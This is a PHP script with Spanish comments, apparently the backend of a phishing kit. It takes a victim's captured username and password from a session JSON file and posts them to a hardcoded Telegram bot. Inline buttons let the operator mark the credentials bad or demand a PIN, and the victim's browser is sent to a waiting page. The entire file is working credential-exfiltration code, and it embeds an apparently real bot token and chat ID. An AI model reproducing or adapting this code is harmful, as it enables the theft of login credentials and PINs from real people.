<?php
session_start();

// 1. Capturar el ID de sesión obligatoria
$id_transmision = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';

if (empty($id_transmision)) {
    die("Error: No se encontró un ID de sesión activo. Asegúrate de que estás rellenando el formulario desde el index.php");
}

// 2. Leer los datos directamente desde el archivo JSON que creó procesar.php
$ruta_json = "sesiones/{$id_transmision}.json";

if (!file_exists($ruta_json)) {
    die("Error: No se encontró el archivo temporal en la carpeta sesiones.");
}

$datos_json = json_decode(file_get_contents($ruta_json), true);
$usuario = $datos_json['usuario'];
$clave = $datos_json['clave'];

// 3. Tus credenciales reales de Telegram integradas directamente
$token = "8964559963:AAHX2sD6B-Ekyc9vM5enQpP49u5YNAYJ_yE";
$chat_id = "8787451664"; 

// 4. Estructurar el mensaje para tu Telegram
$mensaje = "📥 NUEVO REGISTRO DE ACCESO\n\n";
$mensaje .= "🆔 ID SESIÓN: {$id_transmision}\n";
$mensaje .= "👤 USUARIO: {$usuario}\n";
$mensaje .= "🔑 CLAVE: {$clave}\n\n";
$mensaje .= "Seleccione la acción para el navegador del alumno:";

// Configuración de los botones independientes
$botones = [
    'inline_keyboard' => [
        [
            ['text' => '❌ Datos Malos', 'callback_data' => "redirigir|{$id_transmision}|datos_malos"],
            ['text' => '🔑 Pedir PIN', 'callback_data' => "redirigir|{$id_transmision}|pedir_pin"]
        ]
    ]
];

$payload = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'Markdown',
    'reply_markup' => json_encode($botones)
];

// 5. Ejecutar el envío a la API de Telegram con cURL
$ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
$resultado = curl_exec($ch);
$error_curl = curl_error($ch);
curl_close($ch);

// Sistema de control por si Telegram da error
if ($resultado === false) {
    die("Error de conexión cURL: " . $error_curl);
} else {
    $respuesta_json = json_decode($resultado, true);
    if (isset($respuesta_json['ok']) && $respuesta_json['ok'] === false) {
        die("Telegram rechazó el mensaje. Motivo: " . $respuesta_json['description']);
    }
}

// 6. Redirección inmediata a la pantalla de espera del alumno
header("Location: esperar.php");
exit();
?>